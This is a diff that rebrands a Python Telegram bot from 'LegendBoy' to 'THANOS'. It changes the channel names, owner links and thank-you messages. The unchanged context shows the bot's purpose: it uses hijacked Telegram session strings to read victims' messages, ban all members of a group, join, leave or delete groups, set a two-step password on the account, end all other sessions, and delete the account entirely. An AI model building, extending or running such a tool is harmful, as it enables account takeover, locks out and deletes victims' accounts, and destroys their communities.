@@ -188,7 +188,7 @@ import logging
 
 logging.basicConfig(level=logging.WARNING)
 
-channel = "Pro_LegendBots"
+channel = "Thanosbot_chats"
 
 
 menu = """
@@ -242,7 +242,7 @@ keyboard = [
         Button.inline("L", data="Lhack"),
         Button.inline("M", data="Mhack"),
     ],
-    [Button.url("Owner", "https://t.me/Pro_Userboy")],
+    [Button.url("Owner", "https://t.me/THANOSCEO")],
 ]
 
 
@@ -275,7 +275,7 @@ async def users(event):
             )
         if len(i) > 3855:
             file = open("session.txt", "w")
-            file.write(i + "\n\nDetails BY LegendBoy")
+            file.write(i + "\n\nDetails BY THANOS")
             file.close()
             await bot.send_file(event.chat_id, "session.txt")
             system("rm -rf session.txt")
@@ -319,7 +319,7 @@ async def users(event):
         grpid = await x.get_response()
         await userbans(strses.text, grpid.text)
         await event.reply(
-            "Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard
+            "Banning all members. Thanks For using THANOS Bot", buttons=keyboard
         )
 
 
@@ -336,7 +336,7 @@ async def users(event):
                 "This StringSession Has Been Terminated.", buttons=keyboard
             )
         i = await usermsgs(strses.text)
-        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using THANOS Bot", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ehack")))
@@ -355,7 +355,7 @@ async def users(event):
         grpid = await x.get_response()
         await joingroup(strses.text, grpid.text)
         await event.reply(
-            "Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard
+            "Joined the Channel/Group Thanks For using THANOS Bot", buttons=keyboard
         )
 
 
@@ -375,7 +375,7 @@ async def users(event):
         grpid = await x.get_response()
         await leavegroup(strses.text, grpid.text)
         await event.reply(
-            "Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard
+            "Leaved the Channel/Group Thanks For using THANOS Bot,", buttons=keyboard
         )
 
 
@@ -395,7 +395,7 @@ async def users(event):
         grpid = await x.get_response()
         await delgroup(strses.text, grpid.text)
         await event.reply(
-            "Deleted the Channel/Group Thanks For using LegendBoyBot.", buttons=keyboard
+            "Deleted the Channel/Group Thanks For using THANOSBOT.", buttons=keyboard
         )
 
 
@@ -414,7 +414,7 @@ async def users(event):
         i = await user2fa(strses.text)
         if i:
             await event.reply(
-                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
+                "User don't have two step thats why now two step is THANOSBOT Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
                 buttons=keyboard,
             )
         else:
@@ -435,7 +435,7 @@ async def users(event):
             )
         await terminate(strses.text)
         await event.reply(
-            "The all sessions are terminated\n\nThanks For using LegendBoyBot.",
+            "The all sessions are terminated\n\nThanks For using THANOSBOT.",
             buttons=keyboard,
         )
 
@@ -454,7 +454,7 @@ async def users(event):
             )
         await delacc(strses.text)
         await event.reply(
-            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.",
+            "The Account is deleted SUCCESSFULLLY\n\nThanks For using THANOSBOT Bot.",
             buttons=keyboard,
         )
 
@@ -542,5 +542,5 @@ async def users(event):
                 await event.respond("Something is wrong")
         except Exception as e:
             await event.respond(
-                "SEND THIS ERROR TO - @LegendBot_Pros\n**LOGS**\n" + str(e)
+                "SEND THIS ERROR TO - @thanosbot_chats\n**LOGS**\n" + str(e)
             )
